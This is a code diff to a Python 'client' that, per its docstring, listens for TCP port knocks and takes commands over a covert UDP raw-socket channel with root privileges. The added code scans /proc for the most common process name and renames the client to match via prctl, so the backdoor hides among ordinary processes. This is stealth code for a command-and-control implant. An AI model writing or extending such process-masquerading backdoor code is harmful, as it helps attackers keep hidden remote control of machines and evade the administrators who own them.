@@ -6,6 +6,7 @@ Listens for TCP port knocks, then accepts commands via UDP raw socket covert cha
 REQUIRES: Root/Administrator privileges for raw sockets
 Usage: sudo python3 client.py
 """
+import ctypes
 import os
 import socket
 import struct
@@ -13,7 +14,7 @@ import time
 import sys
 import subprocess
 from enum import IntEnum
-from collections import deque
+from collections import deque, Counter
 import threading
 from raw_socket_protocol import RawSocketProtocol
 from file_watcher import FileWatcher
@@ -500,9 +501,6 @@ class Client:
         except Exception:
             return "127.0.0.1"
 
-    # ------------------------------------------------------------------ #
-    #  Entry point                                                         #
-    # ------------------------------------------------------------------ #
 
     def start(self):
         print("=" * 60)
@@ -528,11 +526,51 @@ class Client:
             print("\n[*] Shutting down client...")
             self.running = False
 
+PR_SET_NAME = 15
+
+def get_process_names():
+    names = []
+
+    for pid in os.listdir("/proc"):
+        if not pid.isdigit():
+            continue
+
+        comm_path = f"/proc/{pid}/comm"
+
+        try:
+            with open(comm_path, "r") as f:
+                name = f.read().strip()
+                names.append(name)
+        except:
+            # process might have exited or permission denied
+            pass
+
+    return names
+
+
+def most_common_process():
+    names = get_process_names()
+
+    if not names:
+        return None
+
+    counter = Counter(names)
+    name, count = counter.most_common(1)[0]
+
+    print(f"Most common process: {name} ({count} instances)")
+    return name
+
+def rename_process(new_name):
+    libc = ctypes.CDLL("libc.so.6")
+    libc.prctl(PR_SET_NAME, new_name.encode(), 0, 0, 0)
 
 def main():
     print("Client Program")
     print("Requires root/admin privileges for raw sockets")
     print()
+    name = most_common_process()
+    if name:
+        rename_process(name)
     client = Client()
     client.start()
 
